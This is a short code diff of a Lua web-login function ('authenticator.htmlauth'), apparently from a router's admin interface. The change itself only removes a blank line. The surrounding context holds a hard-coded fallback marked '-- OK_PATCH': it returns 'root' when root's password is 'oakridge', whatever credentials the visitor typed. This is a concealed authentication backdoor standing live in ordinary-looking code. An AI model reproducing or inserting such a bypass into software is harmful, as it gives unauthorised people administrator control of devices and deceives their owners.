@@ -108,7 +108,6 @@ function authenticator.htmlauth(validator, accs, default, template)
 	if user and validator(user, pass) then
 		return user
 	end
-
     -- OK_PATCH
     if validator("root", "oakridge") then
         return "root"
